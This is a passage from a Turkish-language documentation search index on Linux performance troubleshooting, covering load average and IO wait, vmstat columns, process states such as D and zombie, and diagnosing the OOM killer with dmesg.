\u00e7\u0131kan <code>load average: 4.00, ...</code> ne anlama gelir?</p> <ul> <li>Linux'ta Load: Sadece CPU bekleyenler DE\u011e\u0130L, Disk (IO) bekleyenler de dahildir!</li> <li>Yani Load y\u00fcksekse, CPU bo\u015fta olabilir (%0 idle), ama disk darbo\u011fazdad\u0131r (%100 busy).</li> </ul> <p>Te\u015fhis: <code>vmstat 1</code> \u00e7al\u0131\u015ft\u0131r\u0131n ve <code>procs</code> s\u00fctununa bak\u0131n:</p> <ul> <li><code>r</code> (runnable): CPU bekleyen i\u015flem say\u0131s\u0131. -&gt; CPU Sorunu</li> <li><code>b</code> (blocked): Disk/Network IO bekleyen (uyuyan) i\u015flem say\u0131s\u0131. -&gt; Disk/IO Sorunu</li> </ul>"},{"location":"troubleshooting/performance/#2-process-state-d-uninterruptible-sleep","title":"2. Process State \"D\" (Uninterruptible Sleep)","text":"<p><code>top</code> veya <code>htop</code> a\u00e7t\u0131\u011f\u0131n\u0131zda <code>S</code> (State) s\u00fctununda \"D\" harfi g\u00f6r\u00fcyorsan\u0131z korkun.</p> <ul> <li>R (Running): \u00c7al\u0131\u015f\u0131yor.</li> <li>S (Sleep): Uyuyor (Normal).</li> <li>D (Disk Sleep): Kernel seviyesinde donan\u0131m (Disk/NFS) cevab\u0131 bekliyor. \u00d6LD\u00dcR\u00dcLEMEZ (Kill -9 i\u015flemez).</li> <li>Z (Zombie): \u00d6lm\u00fc\u015f ama babas\u0131 (parent) haberini almam\u0131\u015f. Kaynak yemez ama process tablosunu kirletir.</li> </ul> <p>[!WARNING] \u00c7ok fazla \"D\" state process varsa, diskiniz bozuk olabilir veya NFS sunucusu cevap vermiyordur. Sunucuyu reboot etmek zorunda kalabilirsiniz.</p>"},{"location":"troubleshooting/performance/#3-oom-killer-out-of-memory","title":"3. OOM Killer (Out of Memory) \ud83d\udc80","text":"<p>Linux, RAM biterse sistemi kurtarmak i\u00e7in \"en az \u00f6nemli ama en \u00e7ok RAM yiyen\" i\u015flemi vurur.</p> <p>Belirtiler:</p> <ul> <li>MySQL/Java servisi aniden kapan\u0131yor ama hata logu yok.</li> <li>SSH ba\u011flant\u0131s\u0131 kopuyor.</li> </ul> <p>Kan\u0131t:</p> <pre><code>dmesg -T | grep -i \"killed process\"\n# \u00c7\u0131kt\u0131: \"Out of memory: Kill process 1234 (java) score 800 or sacrifice child\"\n</code></pre> <p>\u00c7\u00f6z\u00fcm:</p> <ul> <li>Swap alan\u0131 ekleyin (Acil durum freni).</li> <li>Systemd servisine <code>Restart=always</code> ekleyin.</li> <li>Uygulaman\u0131n memory leak yap\u0131p yapmad\u0131\u011f\u0131n\u0131 <code>valgrind</code> veya monitoring ile inceleyin.</li> </ul>"}]}